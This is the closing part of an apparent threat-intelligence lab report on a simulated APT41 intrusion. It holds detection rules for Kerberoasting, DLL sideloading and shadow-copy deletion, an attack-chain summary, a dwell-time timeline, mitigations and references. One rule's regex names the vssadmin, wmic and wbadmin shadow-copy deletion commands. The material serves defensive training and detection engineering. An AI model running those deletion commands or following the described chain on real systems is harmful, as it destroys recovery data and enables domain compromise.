    description = 
"Kerberoasting — RC4 TGS request for service account (T1558.003)"
    severity    = 
"HIGH"
    technique   = 
"T1558.003"
    note        = 
"Tune against baseline; legacy RC4 environments generate false positives"
events:
    $e.metadata.event_type        = 
"USER_RESOURCE_ACCESS"
    $e.metadata.product_event_type = 
"4769"
    $e.target.resource.attribute.labels[
"TicketEncryptionType"
] = 
"0x17"
    
not
 re.regex($e.target.resource.name, 
`\$$`
)
  condition:
    $e
}
```

```text
rule apt41_dll_sideload_unsigned_java {
  meta:
    author      = 
"Andrey Pautov"
    description = 
"Unsigned jvm.dll loaded by java.exe outside Program Files (T1574.002)"
    severity    = 
"HIGH"
    technique   = 
"T1574.002"
events:
    $e.metadata.event_type        = 
"PROCESS_MODULE_LOAD"
    $e.metadata.product_event_type = 
"7"
    re.regex($e.principal.process.file.full_path, 
`(?i)java\.exe`
)
    re.regex($e.target.process.file.full_path,    
`(?i)jvm\.dll`
)
    
not
 re.regex($e.target.process.file.full_path, 
`(?i)\\Program Files\\`
)
  condition:
    $e
}
```

```text
rule apt41_vss_deletion_pre_ransomware {
  meta:
    author      = 
"Andrey Pautov"
    description = 
"VSS deletion — inhibit system recovery, ransomware pre-staging (T1490)"
    severity    = 
"HIGH"
    technique   = 
"T1490"
events:
    $e.metadata.event_type = 
"PROCESS_LAUNCH"
    re.regex(
      $e.target.process.command_line,
      
`(?i)(vssadmin|wmic|diskshadow|wbadmin).*(delete|remove|shadowcopy)`
    )
  condition:
    $e
}
```

## 10. Defensive Recommendations

### Prioritized Mitigations

<img src="https://cdn-images-1.medium.com/max/800/1*bHLxoCY8kcK09XOvkL6vhw.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

## The Compound Failure Pattern

```text
Log4j unpatched               → 
initial
 access available
+
 credentials 
in
 context.xml  → immediate AD enumeration 
from
 Linux
+
 svc_backup 
over
-
privileged  → Kerberoastable 
AND
 
local
 admin 
on
 WS01
+
 
no
 Credential Guard 
/
 PPL   → LSASS dump 
succeeds
+
 
no
 LAPS                     → single Administrator hash 
lateral
-
moves everywhere
+
 
no
 network segmentation     → web server reaches DC, LDAP, SMB directly
=
 internet → 
full
 domain compromise 
in
 
<
 
72
h
```

Each control, independently, would not have stopped the attack. Combined, they would have broken the chain at multiple points — forcing the attacker to independently defeat several controls, raising noise to detectable levels.

## 11. Dwell Time & Alert Timeline Analysis

**Dwell time: 4 days, 17 hours, 37 minutes.**

<img src="https://cdn-images-1.medium.com/max/800/1*QIankHWPenU3FJ6-E24hUw.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

Mandiant M-Trends 2025 (covering 2024 investigations) reports a global median dwell time of 11 days [8]. This campaign at 4.7 days is below median — conservative, not typical. The key metric is not overall dwell time; it is**time from first Critical alert to analyst acknowledgement.**

```text
Day
 
1
  
14
:
23
        
Initial
 access — 
first
 Critical alert generated
Day
 
4
  
10
:
15
        LSASS alert generated — the alert that eventually triggered escalation
Day
 
5
  
04
:
00
–
16
:
18
  
2.31
 GB exfiltrated (beacon sleep 
0
; restored 
to
 sleep 
60
 after)
Day
 
6
  
08
:
00
        SOC escalation — incident declared
Time
: 
first
 Critical alert → escalation  
=
 
4
 days, 
17
h, 
37
 min
Time
: LSASS alert → escalation           
=
 
1
 
day
, 
21
h, 
45
 min
During the LSASS alert review gap:
  
Day
 
4
  
13
:
00
           DCSync 
-
 
all
 domain hashes obtained
  
Day
 
5
  
02
:
00
           DLL sideloading persistence deployed 
on
 DC01
  
Day
 
5
  
03
:
30
           DNS tunnel established
  
Day
 
5
  
04
:
00
–
16
:
18
     
2.31
 GB exfiltrated 
-
 complete 
16
h before SOC escalation
```

The exfiltration completed 15 hours and 42 minutes before the SOC escalation that opened the incident. The tooling worked. The process did not.

**Recommended KPI:**Mean time to acknowledge (MTTA) for Critical alerts. Target: ≤4 hours. Implement automated escalation for unacknowledged Critical alerts — PagerDuty, phone call, or Slack with no-reply timeout — rather than a queue waiting for manual triage.

## 12. Attribution Assessment

### Alternative Hypotheses

Before attributing to APT41, the same technical chain is consistent with the following:

<img src="https://cdn-images-1.medium.com/max/800/1*FjWhCWt-lbnWwBb0H50-kA.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

Attribution to APT41 (G0096) in a real incident requires evidence beyond technique overlap: infrastructure overlap with known APT41 clusters, malware code-sharing with confirmed APT41 samples (PlugX, CROSSWALK, MESSAGETAP), or intelligence not available from open-source reporting alone.

## TTP Confidence Assessment

<img src="https://cdn-images-1.medium.com/max/800/1*o3BrTY74_mBrJbV5o85neg.png" alt="Article image" width="1672" height="941" loading="lazy" decoding="async" />

## Sourcing Limitations

This report relies exclusively on open-source intelligence. OSINT supports behavioral and technique-level analysis but cannot support definitive attribution. The scenario is designed to train defenders against documented APT41 TTPs and validate detection rules — not to serve as an attribution product.

## 13. References

- US Department of Justice, “Seven International Cyber Defendants, Including ‘APT41’ Actors, Charged in Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally,” September 16, 2020.[https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer)

2. Mandiant, “Double Dragon: APT41, a Dual Espionage and Cyber Crime Operation,” August 2019.[https://cloud.google.com/blog/topics/threat-intelligence/apt41-dual-espionage-and-cyber-crime-operation](https://cloud.google.com/blog/topics/threat-intelligence/apt41-dual-espionage-and-cyber-crime-operation)

3. Mandiant, “APT41 Targeting U.S. State Government Networks,” March 2022.[https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments](https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments)— documents Log4Shell exploitation within hours of public disclosure.

4. CISA et al., “AA21–356A: Mitigating Log4Shell and Other Log4j-Related Vulnerabilities,” December 22, 2021.[https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)

5. MITRE ATT&CK, “APT41 Group G0096.”[https://attack.mitre.org/groups/G0096/](https://attack.mitre.org/groups/G0096/)

6. Group-IB, “Big Game Hunting: The Winnti Group,” 2020.[https://www.group-ib.com/resources/research/](https://www.group-ib.com/resources/research/)

7. Recorded Future, Insikt Group, “Chinese State-Sponsored Group TAG-22 Targets Nepal, the Philippines, and Taiwan Using Winnti and Shadowpad Backdoors,” 2021.[https://www.recordedfuture.com/chinese-state-sponsored-group-tag-22-targets-nepal-philippines-taiwan](https://www.recordedfuture.com/chinese-state-sponsored-group-tag-22-targets-nepal-philippines-taiwan)

8. Mandiant, M-Trends 2025: Data, Insights, and Recommendations From the Frontlines.[https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2025](https://cloud.google.com/blog/topics/threat-intelligence/m-trends-2025)— global median dwell time 11 days for 2024 investigations.

9. National Vulnerability Database, NIST, CVE-2021–44228 — Apache Log4j2 2.0-beta9 through 2.15.0.[https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

10. Fortra (SecureAuth), Impacket.[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

11. BishopFox, Sliver C2 Framework.[https://github.com/BishopFox/sliver](https://github.com/BishopFox/sliver)

12. SpecterOps, BloodHound.[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

13. Volatility Foundation, Volatility3.[https://github.com/volatilityfoundation/volatility3](https://github.com/volatilityfoundation/volatility3)

14. MITRE ATT&CK, “T1574.002 — Hijack Execution Flow: DLL Side-Loading.”[https://attack.mitre.org/techniques/T1574/002/](https://attack.mitre.org/techniques/T1574/002/)

15. MITRE ATT&CK, “T1003.006 — OS Credential Dumping: DCSync.”[https://attack.mitre.org/techniques/T1003/006/](https://attack.mitre.org/techniques/T1003/006/)

16. LOLBAS Project, “certutil.”[https://lolbas-project.github.io/lolbas/Binaries/Certutil/](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)

17. LOLBAS Project, “comsvcs.dll.”[https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/)

18. MITRE ATT&CK, “T1596.003 — Search Open Technical Databases: Digital Certificates.”[https://attack.mitre.org/techniques/T1596/003/](https://attack.mitre.org/techniques/T1596/003/)

19. MITRE ATT&CK, “T1596.005 — Search Open Technical Databases: Scan Databases.”[https://attack.mitre.org/techniques/T1596/005/](https://attack.mitre.org/techniques/T1596/005/)

*Lab repository:*[*github.com/anpa1200/dragonrx-lab*](https://github.com/anpa1200/dragonrx-lab)*
Lab guide:*

[**Lab Architecture — Operation DragonRx**
[Part of the Operation DragonRx series · Overview · Lab Architecture · Attack Playbook · DFIR Walkthrough](2026-05-02-lab-architecture-operation-dragonrx-38602f432e5c.md)

**END OF REPORT**
CTI-2026-APT41–001 | TLP:CLEAR | Draft | Andrey Pautov | 2026–04–25

## Follow for practical cybersecurity research

If you’re interested in**Offensive security,****AI security, real-world attack simulations, CTI, and detection engineering**— this is exactly what I focus on.

Stay connected:

→**Subscribe on Medium:**[medium.com/@1200km](https://medium.com/@1200km)
→**Connect on LinkedIn:**[andrey-pautov](https://www.linkedin.com/in/andrey-pautov/)
→**GitHub — tools & labs:**[github.com/anpa1200](https://github.com/anpa1200)
→**Contact:**[1200km@gmail.com](mailto:1200km@gmail.com)
